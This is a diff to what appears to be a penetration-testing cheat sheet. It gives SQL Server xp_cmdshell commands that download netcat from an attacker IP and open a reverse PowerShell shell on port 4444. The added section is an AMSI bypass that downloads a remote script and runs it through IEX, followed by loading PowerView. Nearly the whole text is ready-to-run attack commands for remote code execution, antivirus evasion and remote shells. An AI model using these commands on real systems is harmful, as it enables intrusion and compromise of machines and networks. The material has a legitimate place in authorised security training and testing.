@@ -163,3 +163,15 @@ EXEC ('xp_cmdshell "curl http://192.168.45.172/nc.exe -o nc.exe ; nc.exe -e powe
 EXEC ('xp_cmdshell "nc.exe -e powershell 192.168.45.172 4444";') AT SQL27;
 > Get a reverse shell after download. Don't forget to listen the port.
 ```
+
+# AMSI Bypass in Powershell
+```
+This script contains malicious content and has been blocked by your antivirus software.
+
+(new-object system.net.webclient).downloadstring('http://192.168.xx.xx/amsi.txt') | IEX
+> That bypass the amsi.
+
+Import-Module .\PowerView.ps1
+> You can import modules now.
+
+```
